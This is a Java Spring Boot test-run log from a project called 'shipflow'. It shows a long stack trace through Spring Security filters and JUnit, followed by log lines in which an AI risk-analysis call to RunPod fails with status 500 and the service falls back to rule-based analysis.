	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:903) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:564) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.PitchHealthControllerIntegrationTest.getCycleHealth_WithAI_ShouldReturnEnhancedAnalysis(PitchHealthControllerIntegrationTest.java:247) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:46.430Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.RiskAnalysisService      : AI analysis failed, falling back to rule-based: Failed to get response from RunPod: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.428686","status":500}
2026-01-17T23:26:46.430Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 37 (withAI=true, TTL=infinite)
2026-01-17T23:26:46.437Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache miss: pitch risk 38 (withAI=true)
2026-01-17T23:26:46.438Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : Submitting prompt to RunPod: 756 chars
